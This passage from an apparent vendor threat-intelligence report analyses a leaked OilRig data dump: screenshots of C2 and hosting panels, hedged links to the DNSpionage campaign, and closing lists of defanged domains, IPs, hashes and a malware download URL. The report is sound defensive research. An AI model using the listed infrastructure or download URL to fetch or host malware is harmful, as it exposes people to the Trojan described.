between the files related to\nDNS hijacking and known infrastructure associated with OilRig.\n\n_Figure 17. Relationship between DNS Hijacking files and OilRig infrastructure_\n\nAlthough we are unable to say with certainty that the DNSpionage operations were\nabsolutely executed by the OilRig group, it is possible based on the provided data that there\nmay be some level of relationship between them.\n\n## Screenshots\n\nThe data dump includes several screenshots of resources that the leaker alleged was related\nto the OilRig group. The screenshots included remote desktop (RDP) sessions showing the\nGlimpse panel, a web browser session displaying a C2 panel called Scarecrow, web browser\nsessions into VPS administrative panels, and evidence of potential destructive attacks\nagainst OilRig servers.\n\nThe screenshot in Figure 18. appears to be a C2 panel for an unknown backdoor. The only\nname provided is Scarecrow, which is not a name we have previously observed or\nassociated with OilRig. The server is hosted on 142.234.157[.]21 which appears to be hosted\nby LeaseWeb. If we are to assume the filename is consistent with a real time snapshot of the\nserver panel, it would indicate that multiple systems were actively compromised as of March\n29, 2019.\n\n\n-----\n\n_Figure 18. Screenshot provided in leak showing Scarecrow panel_\n\nFigure 19 shows an administrative panel to an Iranian based virtual hosting provider called\nBerbid Server. No other infrastructure details are displayed.\n\n_Figure 19. Screenshot provided in leak showing administrative panel for hosting provider_\n_Berbid Server_\n\n\n-----\n\nThe screenshot showed the administrative panel for a VPS account on DeltaHost with four\ndifferent virtual servers, as seen in Figure 20. One of these virtual servers was hosted at an\nIP address of 193.111.152[.]13 and had been up for 194 days (in the red box in Figure 20) at\nthe time this control panel was apparently accessed.\n\n_Figure 20. Screenshot in leak of administrative panel for an account at DeltaHost_\n\nIf we use the filename of this screenshot and assume that it was taken on March 29, 2019\nand subtract 194 days from this date, it is possible that this server had been operational\nsince at least September 16, 2018. On September 24, 2018, we observed an organization\ntargeted by OilRig attempting to download a Zip archive from the following URL:\n\nhxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip\n\nThis Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256:\n5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a\nvariant of the OopsIE Trojan we described in detail in a blog we published in September\n2018. This suggests that the server displayed in the VPS control panel may have indeed\nbeen in use by the OilRig threat actors at the time of attack. In addition, two of the other IPs\nlisted in this panel, 185.161.209[.]57 and 185.161.210[.]25 are in the same\n185.161.208[.]0/22 range as an IP associated with the DNSpionage campaign,\n185.161.211[.]72. This is a tenuous relationship at best and does not indicate that the OilRig\ngroup is the one executing the DNSpionage campaign, but with the combination of the use of\nDeltaHost and IPs belonging to a fairly small range, there may be reason to believe that\nthese are related to some extent.\n\n\n-----\n\nFigure 21 is a screenshot of a C2 server panel for Glimpse, which we track using the name\nBONDUPDATER. This screenshot is via an RDP session as indicated by the tab located at\nthe top of the screen and is located at 164.132.67[.]216 which is hosted by OVH. If we again\nassume the accuracy of the time indicated in the filename, this would indicate that no\ncompromised system had checked in since as far out as 71 days.\n\n_Figure 21. Screenshot in leak of RDP session with a server running the Glimpse C2_\n\n## Conclusion\n\nThis data dump has provided a rare and unusual perspective into the behind-the-scenes\nactivity in an adversary’s operations. It is important to understand that although we are able\nto validate the backdoors and webshells provided in the dataset as consistent with previously\nresearched OilRig toolsets, in general we are unable to validate the origins of the entirety of\nthe dataset and cannot confirm nor deny that the data has not been manipulated in some\nmanner. It is certainly possible that the data dump did indeed originate from a whistleblower,\nbut it is just as likely that a third party was able to extract this data. Looking at the data dump\nas a whole though, the targeting and TTPs are consistent with behaviors we have generally\nassociated with OilRig in the past. Assuming the data in the dump is accurate, it also shows\nthe global reach of the OilRig threat group, which generally is assumed to operate primarily\nin the Middle East. The disparity in regions and industries for organizations potentially\naffected or compromised by OilRig is an excellent example of why organizations regardless\nof region or industry should always maintain situational awareness of adversaries, their\nactivities, and be prepared to defend against any attack.\n\n## Indicators of Compromise\n\n\n-----\n\nDomains\n\nMyleftheart[.]com\noffice365-management[.]com\nmsoffice-cdn[.]com\n\nPoison Frog PS1 files\n\n27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed\n995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd999\n0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea330436c\n\nIPs\n\n185.36.191[.]31\n185.161.209[.]57\n185.161.210[.]25\n164.132.67[.]216\n212.32.226[.]245\n142.234.157[.]21\n193.111.152[.]13\n185.162.235[.]106\n185.162.235[.]29\n185.162.235[.]121\n\nOopsIE payload\n\n5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
